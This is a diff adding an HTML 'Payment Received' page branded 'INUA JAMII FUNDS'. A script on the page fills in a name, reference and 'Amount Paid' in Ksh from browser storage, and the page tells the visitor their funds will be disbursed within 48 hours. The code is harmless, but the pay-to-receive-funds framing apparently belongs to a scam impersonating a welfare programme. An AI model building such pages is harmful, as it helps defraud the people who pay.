@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>INUA JAMII FUNDS - Payment Received</title>
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&amp;display=swap" rel="stylesheet" />
+<style>
+  @media(max-width: 480px){
+    body { zoom: 0.8; }
+    .card { transform: scale(0.9); transform-origin: top; }
+  }
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    background: linear-gradient(135deg, #4CAF50, #81C784);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    padding: 40px 0;
+    box-sizing: border-box;
+  }
+
+  body::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.2);
+    z-index: -1;
+  }
+
+  .card {
+    background: #fff;
+    width: 95%;
+    max-width: 600px;
+    border-radius: 18px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    padding: 50px 30px;
+    position: relative;
+    z-index: 1;
+    box-sizing: border-box;
+    text-align: center;
+  }
+
+  .check-circle {
+    width: 90px;
+    height: 90px;
+    border-radius: 50%;
+    background: #e8f5e9;
+    border: 3px solid #2e7d32;
+    margin: 0 auto 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .check-circle svg {
+    width: 46px;
+    height: 46px;
+  }
+
+  .thank-you-title {
+    font-size: 1.8em;
+    font-weight: 700;
+    color: #00695c;
+    margin: 0 0 16px;
+  }
+
+  .thank-you-message {
+    font-size: 1.05em;
+    color: #333;
+    line-height: 1.6;
+    margin-bottom: 28px;
+  }
+
+  .detail-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 16px;
+    background: #eaf6ea;
+    border-radius: 10px;
+    padding: 12px 16px;
+    text-align: left;
+  }
+
+  .detail-row .label {
+    font-weight: 600;
+    color: #2e7d32;
+    flex-shrink: 0;
+  }
+
+  .detail-row .label::after {
+    content: ":";
+  }
+
+  .detail-row .value {
+    font-weight: 700;
+    color: #222;
+    text-align: right;
+    word-break: break-word;
+  }
+
+  .note {
+    font-size: 0.9em;
+    color: #666;
+    line-height: 1.5;
+    margin-top: 20px;
+  }
+
+  .footer {
+    text-align: center;
+    margin-top: 40px;
+    font-size: 1em;
+    color: #fff;
+    z-index: 1;
+  }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div class="check-circle">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#2e7d32" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M20 6L9 17l-5-5"/>
+    </svg>
+  </div>
+
+  <h1 class="thank-you-title">Thank You!</h1>
+  <p class="thank-you-message" id="mainMessage">
+    Your payment has been received. Your funds are now being processed and will be disbursed in 24hrs-48hrs.
+  </p>
+
+  <div class="detail-list">
+    <div class="detail-row">
+      <span class="label">Name</span>
+      <span class="value" id="val-name">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Reference</span>
+      <span class="value" id="val-reference">—</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Amount Paid</span>
+      <span class="value" id="val-amount">—</span>
+    </div>
+  </div>
+
+  <p class="note">
+    Please keep this reference number for your records. If you have any questions
+    about your disbursement, get in touch with our support team and quote the
+    reference above.
+  </p>
+</div>
+
+<div class="footer">
+  🇰🇪 INUA JAMII FUNDS - Transforming Lives 🇰🇪
+</div>
+
+<script>
+(function() {
+  let data = {};
+  try {
+    const raw = localStorage.getItem('nyota_finalData');
+    if (raw) data = JSON.parse(raw);
+  } catch (e) {
+    // ignore invalid JSON
+  }
+
+  const fallback = '—';
+  function fill(id, value) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = (value === undefined || value === null || String(value).trim() === '')
+      ? fallback
+      : value;
+  }
+
+  fill('val-name', data.full_names || data.first_name);
+  fill('val-reference', data.pendingPaymentReference);
+  fill('val-amount', data.confirmedAmount ? ('Ksh ' + data.confirmedAmount) : fallback);
+})();
+</script>
+
+</body>
+</html>
